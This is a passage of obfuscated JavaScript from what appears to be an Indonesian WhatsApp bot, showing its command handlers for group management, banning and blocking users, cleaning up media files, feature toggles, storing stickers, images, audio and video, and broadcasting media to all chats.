            if (!_0x1b1e88[_0x5804c8(0x6a4)]) return _0x358f3b(_0x5804c8(0x6bd));
            if (!_0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xc4a)]) return _0x358f3b(_0x5804c8(0x411));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x508) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x395));
            let _0x30ac2c = _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xc4a)]['toString']('base64');
            if (db['data']['sticker'][_0x30ac2c] && db[_0x5804c8(0x233)][_0x5804c8(0xc70)][_0x30ac2c][_0x5804c8(0x642)]) return _0x358f3b('You have no permission to change this sticker command');
            db[_0x5804c8(0x233)][_0x5804c8(0xc70)][_0x30ac2c] = {
                'text': _0x1b04cf,
                'mentionedJid': _0x1b1e88[_0x5804c8(0x583)],
                'creator': _0x1b1e88[_0x5804c8(0xd13)],
                'at': +new Date(),
                'locked': ![]
            }, _0x358f3b(_0x5804c8(0x58e));
        }
        break;
        case 'delcmd': {
            let _0x115a23 = _0x1b1e88['quoted']['fileSha256']['toString'](_0x5804c8(0x77e));
            if (!_0x115a23) return _0x358f3b(_0x5804c8(0x411));
            if (db[_0x5804c8(0x233)][_0x5804c8(0xc70)][_0x115a23] && db[_0x5804c8(0x233)][_0x5804c8(0xc70)][_0x115a23][_0x5804c8(0x642)]) return _0x358f3b('You have no permission to change this sticker command');
            delete db[_0x5804c8(0x233)][_0x5804c8(0xc70)][_0x115a23], _0x358f3b(_0x5804c8(0x58e));
        }
        break;
        case _0x5804c8(0x2e6): {
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x690));
            let _0x5014f6 = await _0x588c41[_0x5804c8(0x56a)][_0x5804c8(0xc4d)]()[_0x5804c8(0xd6e)](_0x4e27b6 => _0x4e27b6['id']['endsWith'](_0x5804c8(0xc4e)))[_0x5804c8(0x686)](_0x25078e => _0x25078e['id']),
                _0x47af46 = _0x5804c8(0x1e1) + _0x5014f6['length'] + _0x5804c8(0x297);
            for (let _0x31f6a2 of _0x5014f6) {
                let _0x277118 = await _0x614da8[_0x5804c8(0x5b3)](_0x31f6a2);
                _0x47af46 += _0x5804c8(0x6fa) + _0x277118[_0x5804c8(0x75a)] + _0x5804c8(0xc8e) + (_0x277118[_0x5804c8(0x9cc)] !== undefined ? '@' + _0x277118['owner'][_0x5804c8(0x4bd)]
                    `@` [0x0] : 'Unknown') + _0x5804c8(0x302) + _0x277118['id'] + '\x0a*Made :* ' + moment(_0x277118[_0x5804c8(0x3c5)] * 0x3e8)['tz'](_0x5804c8(0x7c5))[_0x5804c8(0xb27)]('DD/MM/YYYY HH:mm:ss') + _0x5804c8(0x469) + _0x277118['participants'][_0x5804c8(0x977)] + _0x5804c8(0x50a);
            }
            _0x614da8['sendTextWithMentions'](_0x1b1e88[_0x5804c8(0x60f)], _0x47af46, _0x1b1e88);
        }
        break;
        case 'creategc': {
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x690));
            if (!_0x83eae5[_0x5804c8(0xc6c)](' ')) return _0x358f3b('Masukkan nama grup');
            let _0x4533b0 = await _0x614da8[_0x5804c8(0x478)](_0x83eae5[_0x5804c8(0xc6c)](' '), []),
                _0x45f783 = await _0x614da8[_0x5804c8(0xcad)](_0x4533b0['id']);
            _0x39c4be = _0x5804c8(0x12f) + _0x4533b0['subject'] + _0x5804c8(0x71b) + _0x4533b0[_0x5804c8(0x9cc)][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x5ee) + moment(_0x4533b0[_0x5804c8(0x3c5)] * 0x3e8)['tz']('Asia/Jakarta')[_0x5804c8(0xb27)](_0x5804c8(0x526)) + _0x5804c8(0x8bb) + _0x45f783 + '\x0a', _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x39c4be,
                'mentions': parseMention(_0x39c4be)
            }, {
                'quoted': _0x1b1e88
            }), await sleep(0x1f4), _0x614da8[_0x5804c8(0x938)]('' + _0x53b8b8['id'], {
                'text': 'Welcome to the new group members hehe'
            });
        }
        break;
        case _0x5804c8(0x6b1):
        case _0x5804c8(0xc6c): {
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x7ff));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xb53) + (_0x3b7c58 + _0x453fc1) + ' _linkgrup_');
            if (!isUrl(_0x83eae5[0x0]) && !_0x83eae5[0x0][_0x5804c8(0x34b)](_0x5804c8(0x718))) return _0x358f3b(mess[_0x5804c8(0x5d2)]['Iv']);
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x11dd38 = _0x83eae5[0x0]['split'](_0x5804c8(0x95f))[0x1];
            await _0x614da8[_0x5804c8(0x2cc)](_0x11dd38)[_0x5804c8(0xabe)](_0x444e3c => _0x358f3b(jsonformat(_0x444e3c)))['catch'](_0x5924c0 => _0x358f3b(jsonformat(_0x5924c0)));
        }
        break;
        case _0x5804c8(0x179): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            await _0x614da8[_0x5804c8(0x8e1)](_0x1b1e88[_0x5804c8(0x60f)])[_0x5804c8(0xabe)](_0x35b282 => _0x358f3b(jsonformat(_0x35b282)))[_0x5804c8(0xb9d)](_0x44d469 => _0x358f3b(jsonformat(_0x44d469)));
        }
        break;
        case _0x5804c8(0x160): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            _0x614da8[_0x5804c8(0x160)] = !![], _0x358f3b(_0x5804c8(0xc26));
        }
        break;
        case _0x5804c8(0x180): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            _0x614da8[_0x5804c8(0x160)] = ![], _0x358f3b('Sukses Change To Self Mode');
        }
        break;
        case _0x5804c8(0x843):
        case _0x5804c8(0x844): {
            if (!_0x7b6ab6) return _0x358f3b('Khusus Owner');
            let _0x320858;
            try {
                if (_0x1b1e88[_0x5804c8(0xcea)]) _0x320858 = _0x1b1e88[_0x5804c8(0x583)][0x0] ? _0x1b1e88['mentionedJid'][0x0] : _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)];
            } catch (_0x2efd49) {
                if (_0x1b1e88[_0x5804c8(0xcea)]) _0x320858 = _0x1b04cf + _0x5804c8(0x7cd);
            }
            if (!_0x320858) return _0x358f3b(_0x5804c8(0x3d3));
            const _0x399eee = user_ban['includes'](_0x320858);
            if (_0x399eee) return _0x358f3b(_0x399eee + _0x5804c8(0x6a1));
            user_ban[_0x5804c8(0x453)](_0x320858), fs[_0x5804c8(0x933)](_0x5804c8(0x443), JSON[_0x5804c8(0x736)](user_ban, 0x2, null)), await sleep(0x1f4), _0x358f3b(_0x320858 + _0x5804c8(0xb40));
        }
        break;
        case _0x5804c8(0x6d4):
        case _0x5804c8(0xbc0): {
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x224));
            let _0xd5421a;
            try {
                if (_0x1b1e88[_0x5804c8(0xcea)]) _0xd5421a = _0x1b1e88['mentionedJid'][0x0] ? _0x1b1e88[_0x5804c8(0x583)][0x0] : _0x1b1e88[_0x5804c8(0x6a4)]['sender'];
            } catch (_0x26d409) {
                if (_0x1b1e88[_0x5804c8(0xcea)]) _0xd5421a = _0x1b04cf + '@s.whatsapp.net';
            }
            if (!_0xd5421a) return _0x358f3b(_0x5804c8(0x2d2));
            user_ban[_0x5804c8(0x217)](_0xd5421a, 0x1), fs['writeFileSync']('./database/banned.json', JSON['stringify'](user_ban, 0x2, null)), await sleep(0x1f4), _0x358f3b(_0xd5421a + '\x0aHuft untung lu di Unbanned jdi bisa akses fitur bot lagi:v');
        }
        break;
        case _0x5804c8(0xa1e):
        case _0x5804c8(0x44b): {
            var _0xeac8f9 = _0x5804c8(0xc79) + user_ban[_0x5804c8(0x977)] + '*';
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0xeac8f9,
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x358b6e,
                        'body': '',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x83e):
        case 'blok':
            if (!_0x7b6ab6) return _0x358f3b(mess['OnlyOwner']);
            if (!_0x1b04cf) return _0x358f3b('Masukkan nomor target!');
            let _0x46e59e = q[_0x5804c8(0xa72)](/[^0-9]/g, '') + _0x5804c8(0x7cd);
            _0x614da8[_0x5804c8(0x80f)](_0x46e59e, _0x5804c8(0x83e)), _0x358f3b(_0x5804c8(0x53f) + _0x46e59e[_0x5804c8(0x4bd)]('@')[0x0]);
            break;
        case _0x5804c8(0xba8):
        case _0x5804c8(0x794):
            if (!_0x7b6ab6) return _0x358f3b(mess['OnlyOwner']);
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x5f6));
            let _0x6b0015 = q[_0x5804c8(0xa72)](/[^0-9]/g, '') + _0x5804c8(0x7cd);
            _0x614da8[_0x5804c8(0x80f)](_0x6b0015, _0x5804c8(0xba8)), _0x358f3b(_0x5804c8(0x3ad) + _0x6b0015[_0x5804c8(0x4bd)]('@')[0x0]);
            break;
        case _0x5804c8(0xca8):
        case _0x5804c8(0xd48):
            let _0x463ffe = await _0x614da8[_0x5804c8(0x8f3)]();
            _0x358f3b('*LIST BLOCK*\x0a' + ('Total: ' + (_0x463ffe == undefined ? '*0* Diblokir' : '*' + _0x463ffe[_0x5804c8(0x977)] + _0x5804c8(0x26a)) + '\x0a\x0a') + _0x463ffe['map'](_0x4db0a0 => '» @' + _0x4db0a0[_0x5804c8(0xa72)](/@.+/, ''))[_0x5804c8(0xc6c)]
                `\n`);
            break;
        case 'sampah':
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            let _0x51905c = await fs['readdirSync'](_0x5804c8(0xbd4));
            var _0x39c4be = _0x5804c8(0x3e8);
            _0x39c4be += _0x5804c8(0xd76) + _0x51905c[_0x5804c8(0xd6e)](_0x540f85 => _0x540f85['endsWith'](_0x5804c8(0x79a)) || _0x540f85[_0x5804c8(0x470)](_0x5804c8(0x52c)) || _0x540f85[_0x5804c8(0x470)](_0x5804c8(0x874)) || _0x540f85[_0x5804c8(0x470)]('mp4') || _0x540f85['endsWith'](_0x5804c8(0x48a)) || _0x540f85[_0x5804c8(0x470)](_0x5804c8(0x53c)) || _0x540f85[_0x5804c8(0x470)]('webp') || _0x540f85['endsWith'](_0x5804c8(0x49c)))[_0x5804c8(0x686)](_0xccc0d4 => _0xccc0d4)[_0x5804c8(0x977)] + _0x5804c8(0x4d3), _0x39c4be += _0x51905c[_0x5804c8(0xd6e)](_0x2871fa => _0x2871fa[_0x5804c8(0x470)](_0x5804c8(0x79a)) || _0x2871fa[_0x5804c8(0x470)](_0x5804c8(0x52c)) || _0x2871fa['endsWith'](_0x5804c8(0x874)) || _0x2871fa[_0x5804c8(0x470)](_0x5804c8(0x223)) || _0x2871fa['endsWith'](_0x5804c8(0x48a)) || _0x2871fa['endsWith']('jpeg') || _0x2871fa[_0x5804c8(0x470)]('webp') || _0x2871fa[_0x5804c8(0x470)](_0x5804c8(0x49c)))[_0x5804c8(0x686)](_0x462c5b => _0x462c5b + '\x0a')[_0x5804c8(0xc6c)](''), _0x358f3b(_0x39c4be);
            break;
        case 'delsampah': {
            if (!_0x7b6ab6) return _0x358f3b(mess['OnlyOwner']);
            let _0x52b17d = path[_0x5804c8(0xc6c)]('./sticker');
            fs[_0x5804c8(0x2d4)](_0x52b17d, async function (_0x4f8679, _0x27853e) {
                const _0x4a1351 = _0x5804c8;
                if (_0x4f8679) return _0x358f3b(_0x4a1351(0xbcc) + _0x4f8679);
                let _0x2f25fc = await _0x27853e[_0x4a1351(0xd6e)](_0x3fc094 => _0x3fc094[_0x4a1351(0x470)](_0x4a1351(0x79a)) || _0x3fc094[_0x4a1351(0x470)](_0x4a1351(0x52c)) || _0x3fc094[_0x4a1351(0x470)](_0x4a1351(0x874)) || _0x3fc094[_0x4a1351(0x470)]('mp4') || _0x3fc094[_0x4a1351(0x470)](_0x4a1351(0x48a)) || _0x3fc094[_0x4a1351(0x470)](_0x4a1351(0x53c)) || _0x3fc094[_0x4a1351(0x470)](_0x4a1351(0x6f4)) || _0x3fc094['endsWith'](_0x4a1351(0x49c)));
                var _0x5caaeb = _0x4a1351(0xd56) + _0x2f25fc['length'] + _0x4a1351(0xc48);
                if (_0x2f25fc['length'] == 0x0) return _0x358f3b(_0x5caaeb);
                _0x2f25fc[_0x4a1351(0x686)](function (_0x595931, _0x43d1a6) {
                    _0x5caaeb += _0x43d1a6 + 0x1 + ('. ' + _0x595931 + '\x0a');
                }), _0x358f3b(_0x5caaeb), await sleep(0x7d0), _0x358f3b(_0x4a1351(0x9ff)), await _0x2f25fc[_0x4a1351(0x9c5)](function (_0x358175) {
                    const _0x20b9fb = _0x4a1351;
                    fs[_0x20b9fb(0x850)](_0x20b9fb(0x364) + _0x358175);
                }), await sleep(0x7d0), _0x358f3b(_0x4a1351(0x3ef));
            });
        }
        break;
        case 'sampah2':
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            let _0x4d5b4f = await fs[_0x5804c8(0x394)]('./');
            var _0x39c4be = 'JUMLAH SAMPAH SYSTEM\x0a\x0a';
            _0x39c4be += 'Total : ' + _0x51905c['filter'](_0x4b8415 => _0x4b8415['endsWith']('mp3'))[_0x5804c8(0x686)](_0x3a41d4 => _0x3a41d4)['length'] + _0x5804c8(0x4d3), _0x39c4be += _0x4d5b4f['filter'](_0x14a3c0 => _0x14a3c0[_0x5804c8(0x470)](_0x5804c8(0x874)))[_0x5804c8(0x686)](_0x108d4c => _0x108d4c + '\x0a')[_0x5804c8(0xc6c)](''), _0x358f3b(_0x39c4be);
            break;
        case _0x5804c8(0xb1c): {
            if (!_0x7b6ab6) return _0x358f3b(mess['OnlyOwner']);
            let _0x433f01 = path[_0x5804c8(0xc6c)]('./');
            fs['readdir'](_0x433f01, async function (_0x1fafa6, _0x5a0c6f) {
                const _0x371c40 = _0x5804c8;
                if (_0x1fafa6) return _0x358f3b('Tidak dapat memindai direktori: ' + _0x1fafa6);
                let _0x16a26f = await _0x5a0c6f[_0x371c40(0xd6e)](_0x8e9c2b => _0x8e9c2b[_0x371c40(0x470)](_0x371c40(0x874)));
                var _0x3f9d30 = _0x371c40(0xd56) + _0x16a26f[_0x371c40(0x977)] + ' file sampah\x0a\x0a';
                if (_0x16a26f['length'] == 0x0) return _0x358f3b(_0x3f9d30);
                _0x16a26f[_0x371c40(0x686)](function (_0x7ce9a1, _0x3a195a) {
                    _0x3f9d30 += _0x3a195a + 0x1 + ('. ' + _0x7ce9a1 + '\x0a');
                }), _0x358f3b(_0x3f9d30), await sleep(0x7d0), _0x358f3b(_0x371c40(0x9ff)), await _0x16a26f[_0x371c40(0x9c5)](function (_0x16b774) {
                    const _0x1bd8ea = _0x371c40;
                    fs[_0x1bd8ea(0x850)]('./' + _0x16b774);
                }), await sleep(0x7d0), _0x358f3b(_0x371c40(0x3ef));
            });
        }
        break;
        case _0x5804c8(0x204): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0x294) + (_0x3b7c58 + _0x453fc1));
            if (!/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x294) + (_0x3b7c58 + _0x453fc1));
            if (/webp/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x294) + (_0x3b7c58 + _0x453fc1));
            let _0x5b593b = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a);
            await _0x614da8[_0x5804c8(0x4ae)](_0x1117db, {
                'url': _0x5b593b
            })[_0x5804c8(0xb9d)](_0x1d22fe => fs[_0x5804c8(0x850)](_0x5b593b)), _0x358f3b(_0x5804c8(0x73f));
        }
        break;
        case _0x5804c8(0x7a2): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b(_0x5804c8(0xccf));
            if (_0x83eae5[0x0] === 'on') {
                if (_0x4c18ee) return _0x358f3b(_0x5804c8(0x578));
                _nsfw[_0x5804c8(0x453)](_0x1b1e88[_0x5804c8(0x60f)]), fs[_0x5804c8(0x933)](_0x5804c8(0x838), JSON[_0x5804c8(0x736)](_nsfw)), _0x358f3b(_0x5804c8(0x986));
            } else {
                if (_0x83eae5[0x0] === 'off') {
                    if (!_0x4c18ee) return _0x358f3b('Udh off di group ini');
                    _nsfw[_0x5804c8(0x217)](_0x1b1e88[_0x5804c8(0x60f)], 0x1), fs[_0x5804c8(0x933)](_0x5804c8(0x838), JSON[_0x5804c8(0x736)](_nsfw)), _0x358f3b(_0x5804c8(0x6ef));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + _0x5804c8(0x1d7) + (_0x3b7c58 + _0x453fc1) + ' off -- _Menonaktifkan_');
            }
        }
        break;
        case _0x5804c8(0x4e4): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (_0x83eae5[0x0] === 'on') {
                if (_0x932571['autobio'] === !![]) return _0x358f3b(_0x5804c8(0xbc9));
                _0x932571[_0x5804c8(0x4e4)] = !![], _0x358f3b(_0x5804c8(0xd02));
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    if (_0x932571[_0x5804c8(0x4e4)] === ![]) return _0x358f3b('Udh off');
                    _0x932571[_0x5804c8(0x4e4)] = ![], _0x358f3b('Autobio berhasil dinonaktifkan');
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + _0x5804c8(0x1d7) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case 'anticall': {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (_0x83eae5[0x0] === 'on') {
                if (_0x932571[_0x5804c8(0x286)] === !![]) return _0x358f3b(_0x5804c8(0xbc9));
                _0x932571[_0x5804c8(0x286)] = !![], _0x358f3b(_0x5804c8(0x92b));
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    if (_0x932571[_0x5804c8(0x286)] === ![]) return _0x358f3b(_0x5804c8(0xd3b));
                    _0x932571[_0x5804c8(0x286)] = ![], _0x358f3b('Anticall berhasil dinonaktifkan');
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + ' on -- _mengaktifkan_\x0a' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case _0x5804c8(0xc74): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (_0x83eae5[0x0] === 'on') {
                if (_0x932571[_0x5804c8(0xc74)] === !![]) return _0x358f3b('Udh on');
                _0x932571['autorespond'] = !![], _0x358f3b('Autorespond berhasil diaktifkan');
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    if (_0x932571[_0x5804c8(0xc74)] === ![]) return _0x358f3b(_0x5804c8(0xd3b));
                    _0x932571[_0x5804c8(0xc74)] = ![], _0x358f3b(_0x5804c8(0x98d));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + ' on -- _mengaktifkan_\x0a' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case 'autoblok':
        case _0x5804c8(0x1a5): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (_0x83eae5[0x0] === 'on') {
                if (_0x932571[_0x5804c8(0x1a5)] === !![]) return _0x358f3b('Udh on');
                _0x932571[_0x5804c8(0x1a5)] = !![], _0x358f3b(_0x5804c8(0xb8c));
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    if (_0x932571[_0x5804c8(0x1a5)] === ![]) return _0x358f3b(_0x5804c8(0xd3b));
                    _0x932571[_0x5804c8(0x1a5)] = ![], _0x358f3b('Autoblok berhasil dinonaktifkan');
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + _0x5804c8(0x1d7) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case 'autoread': {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (_0x83eae5[0x0] === 'on') {
                if (_0x932571[_0x5804c8(0x781)] === !![]) return _0x358f3b(_0x5804c8(0xbc9));
                _0x932571[_0x5804c8(0x781)] = !![], _0x358f3b(_0x5804c8(0xa18));
            } else {
                if (_0x83eae5[0x0] === 'off') {
                    if (_0x932571[_0x5804c8(0x781)] === ![]) return _0x358f3b(_0x5804c8(0xd3b));
                    _0x932571[_0x5804c8(0x781)] = ![], _0x358f3b(_0x5804c8(0x133));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + _0x5804c8(0x1d7) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case 'addstiker':
        case _0x5804c8(0x9c1):
        case _0x5804c8(0xcb6): {
            if (!_0x1b1e88['key']['fromMe'] && !_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!/webp/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b('Contoh : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc01));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xcba) + (_0x3b7c58 + _0x453fc1) + ' halo');
            if (_0x1b04cf[_0x5804c8(0x34b)]('|')) return _0x358f3b('Contoh : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc01));
            let _0x27b4dc = await _0x614da8['downloadMediaMessage'](_0x8a4e1a);
            setiker[_0x5804c8(0x453)]('' + _0x1b04cf), fs[_0x5804c8(0x933)](_0x5804c8(0xb7b) + _0x1b04cf + _0x5804c8(0x6a8), _0x27b4dc), fs[_0x5804c8(0x933)]('./database/stik.json', JSON[_0x5804c8(0x736)](setiker)), _0x358f3b(_0x5804c8(0xc96) + _0x3b7c58 + 'liststik');
        }
        break;
        case 'liststik':
        case _0x5804c8(0x808):
        case _0x5804c8(0x956): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x39c4be = _0x5804c8(0x7d3);
            for (let _0x1f5b1d of setiker) {
                _0x39c4be += '- ' + _0x1f5b1d + '\x0a';
            }
            _0x39c4be += '\x0a*Total : ' + setiker[_0x5804c8(0x977)] + _0x5804c8(0x7fa), _0x358f3b(_0x39c4be);
            break;
        }
        case _0x5804c8(0x1a3):
        case 'addimage':
        case _0x5804c8(0x548):
        case _0x5804c8(0xa24): {
            if (!_0x1b1e88['key'][_0x5804c8(0xcbd)] && !_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b('Contoh : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc01));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xcba) + (_0x3b7c58 + _0x453fc1) + ' halo');
            if (_0x1b04cf[_0x5804c8(0x34b)]('|')) return _0x358f3b('Contoh : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc01));
            let _0x18af62 = await _0x614da8[_0x5804c8(0xa20)](_0x8a4e1a);
            imagenye[_0x5804c8(0x453)]('' + _0x1b04cf), fs[_0x5804c8(0x933)]('./database/' + _0x1b04cf + '.jpg', _0x18af62), fs[_0x5804c8(0x933)](_0x5804c8(0x375), JSON[_0x5804c8(0x736)](imagenye)), _0x358f3b(_0x5804c8(0x5bd) + _0x3b7c58 + _0x5804c8(0x622));
        }
        break;
        case 'listimage':
        case 'imagelist':
        case _0x5804c8(0x622): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x39c4be = _0x5804c8(0x348);
            for (let _0x4da94d of imagenye) {
                _0x39c4be += '- ' + _0x4da94d + '\x0a';
            }
            _0x39c4be += _0x5804c8(0x8b0) + imagenye[_0x5804c8(0x977)] + _0x5804c8(0x433), _0x358f3b(_0x39c4be);
            break;
        }
        case _0x5804c8(0x71d):
        case 'addvidio':
        case _0x5804c8(0x5c9): {
            if (!_0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xcbd)] && !_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!/video/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0xcba) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc01));
            if ((_0x8a4e1a['msg'] || _0x8a4e1a)[_0x5804c8(0xbb1)] > 0x1f) return _0x358f3b(_0x5804c8(0x3e9));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xcba) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc01));
            if (_0x1b04cf[_0x5804c8(0x34b)]('|')) return _0x358f3b('Contoh : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc01));
            let _0xf59cf5 = await _0x614da8[_0x5804c8(0xa20)](_0x8a4e1a);
            videonye[_0x5804c8(0x453)]('' + _0x1b04cf), fs[_0x5804c8(0x933)]('./database/' + _0x1b04cf + '.mp4', _0xf59cf5), fs[_0x5804c8(0x933)](_0x5804c8(0xb92), JSON[_0x5804c8(0x736)](videonye)), _0x358f3b(_0x5804c8(0x950) + _0x3b7c58 + _0x5804c8(0x39b));
        }
        break;
        case _0x5804c8(0x57c):
        case 'listvidio':
        case _0x5804c8(0x39b):
        case _0x5804c8(0x784): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x39c4be = _0x5804c8(0x801);
            for (let _0x406053 of videonye) {
                _0x39c4be += '- ' + _0x406053 + '\x0a';
            }
            _0x39c4be += _0x5804c8(0x8b0) + videonye[_0x5804c8(0x977)] + _0x5804c8(0x291), _0x358f3b(_0x39c4be);
            break;
        }
        case _0x5804c8(0x64a):
        case 'addaudio':
        case _0x5804c8(0x4fc): {
            if (!_0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xcbd)] && !_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!/audio/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0xcba) + (_0x3b7c58 + _0x453fc1) + ' halo');
            if ((_0x8a4e1a[_0x5804c8(0x278)] || _0x8a4e1a)[_0x5804c8(0xbb1)] > 0x1f) return _0x358f3b(_0x5804c8(0x3e9));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xcba) + (_0x3b7c58 + _0x453fc1) + ' halo');
            if (_0x1b04cf['includes']('|')) return _0x358f3b(_0x5804c8(0xcba) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc01));
            let _0x2465cb = await _0x614da8[_0x5804c8(0xa20)](_0x8a4e1a);
            audionye[_0x5804c8(0x453)]('' + _0x1b04cf), fs['writeFileSync'](_0x5804c8(0xb7b) + _0x1b04cf + _0x5804c8(0x7eb), _0x2465cb), fs[_0x5804c8(0x933)](_0x5804c8(0xb8f), JSON[_0x5804c8(0x736)](audionye)), _0x358f3b('Sukses Menambahkan Vn / audio \x0aCek dengan cara ' + _0x3b7c58 + _0x5804c8(0x4be));
        }
        break;
        case 'listvn':
        case _0x5804c8(0xb51): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x39c4be = _0x5804c8(0x789);
            for (let _0x24985f of audionye) {
                _0x39c4be += '- ' + _0x24985f + '\x0a';
            }
            _0x39c4be += _0x5804c8(0x8b0) + audionye[_0x5804c8(0x977)] + _0x5804c8(0x1ef), _0x358f3b(_0x39c4be);
            break;
        }
        case 'bcimage':
        case _0x5804c8(0x8ae): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xd03) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd35));
            if (!/image/ ['test'](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0xd03) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd35));
            let _0x4a2f14 = await _0x588c41['chats'][_0x5804c8(0xc4d)]()[_0x5804c8(0x686)](_0x6c4008 => _0x6c4008['id']),
                _0x3bb6fe = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                _0x126517 = fs[_0x5804c8(0x456)](_0x3bb6fe);
            for (let _0x146319 of _0x4a2f14) {
                let _0x5a8b20 = _0x5804c8(0x434) + _0x1b04cf;
                _0x614da8[_0x5804c8(0x938)](_0x146319, {
                    'image': _0x126517,
                    'caption': _0x5a8b20
                }, {
                    'quoted': _0x51e31f
                });
            }
            _0x358f3b(_0x5804c8(0xcc3));
        }
        break;
        case 'bcvideo':
        case _0x5804c8(0xc83): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!_0x1b04cf) return _0x358f3b('Reply video dengan caption ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd35));
            if (!/video/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x4e2) + (_0x3b7c58 + _0x453fc1) + ' Tes');
            let _0x49d063 = await _0x588c41['chats'][_0x5804c8(0xc4d)]()[_0x5804c8(0x686)](_0x3db85a => _0x3db85a['id']),
